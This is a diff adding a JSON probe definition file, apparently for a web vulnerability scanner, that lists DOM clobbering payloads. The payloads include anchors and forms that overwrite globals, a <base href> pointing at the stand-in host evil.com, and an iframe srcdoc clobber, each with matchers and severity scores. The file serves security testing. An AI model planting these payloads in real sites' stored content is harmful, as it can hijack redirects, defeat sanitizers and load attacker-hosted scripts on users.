@@ -1,0 +1,76 @@
+{
+  "category": "dom_clobbering",
+  "description": "DOM clobbering — HTML elements with id/name attributes overwrite global JS variables, causing same-origin attacks via stored content (comments, profile fields, markdown).",
+  "contexts": {
+    "form_clobbering": {
+      "description": "Stored HTML where <form id=X> or <img id=X> clobbers a global variable referenced by client JS. High-impact when the variable controls auth, redirect, or sink calls.",
+      "tech_match": [],
+      "param_match": ["comment", "bio", "description", "post", "message", "content", "html", "markdown", "profile"],
+      "probes": [
+        {
+          "payload": "<a id=globalConfig href='https://evil.com'>x</a>",
+          "description": "Clobber globalConfig — reachable via document.globalConfig (named element collection). Verify in DOM after render.",
+          "matchers": [{"type": "word", "any": ["globalConfig", "id=globalConfig", "id=\"globalConfig\""]}],
+          "severity": "high",
+          "confidence_boost": 35,
+          "variables": {}
+        },
+        {
+          "payload": "<form id=test><input id=action value='https://evil.com/x'></form>",
+          "description": "Two-level clobber — document.test.action.value attacker-controlled. Common in form-action / redirect handlers.",
+          "matchers": [{"type": "word", "any": ["id=test", "id=\"test\"", "id=\\\"test\\\""]}, {"type": "word", "any": ["id=action", "id=\"action\""]}],
+          "severity": "high",
+          "confidence_boost": 35,
+          "variables": {}
+        },
+        {
+          "payload": "<img name=querySelector>",
+          "description": "Override DOM query API — document.querySelector becomes attacker element, breaking sanitizer logic that relies on querySelector.",
+          "matchers": [{"type": "word", "any": ["name=querySelector", "name=\"querySelector\""]}],
+          "severity": "high",
+          "confidence_boost": 30,
+          "variables": {}
+        },
+        {
+          "payload": "<form id=document><input id=cookie value=stolen>",
+          "description": "Clobber document.cookie reference in client-side cookie checks. Bypasses naive 'if (!document.cookie)' patterns.",
+          "matchers": [{"type": "word", "any": ["id=document", "id=\"document\""]}],
+          "severity": "high",
+          "confidence_boost": 30,
+          "variables": {}
+        },
+        {
+          "payload": "<a id=URL href='https://evil.com'></a><a id=URL href='https://evil.com/2'></a>",
+          "description": "Same id repeated yields HTMLCollection — useful for clobbering arrays / iterators.",
+          "matchers": [{"type": "word", "any": ["id=URL", "id=\"URL\""]}],
+          "severity": "medium",
+          "confidence_boost": 25,
+          "variables": {}
+        },
+        {
+          "payload": "<base href='https://evil.com/'>",
+          "description": "<base href> clobbering — relative URLs in subsequent <script src> or fetch() calls resolve to attacker host. Test if stored.",
+          "matchers": [{"type": "word", "any": ["<base href", "<base\thref"]}],
+          "severity": "critical",
+          "confidence_boost": 50,
+          "variables": {}
+        }
+      ]
+    },
+    "iframe_srcdoc_clobber": {
+      "description": "Sandboxed iframe srcdoc that clobbers parent globals via window.frames[N].contentWindow access patterns.",
+      "tech_match": [],
+      "param_match": ["html", "iframe", "embed"],
+      "probes": [
+        {
+          "payload": "<iframe srcdoc=\"<a id=top href='https://evil.com'>\">",
+          "description": "Iframe with clobbering srcdoc. Parent's window.top read becomes the iframe's anchor.",
+          "matchers": [{"type": "word", "any": ["srcdoc=", "srcdoc=\""]}],
+          "severity": "high",
+          "confidence_boost": 30,
+          "variables": {}
+        }
+      ]
+    }
+  }
+}
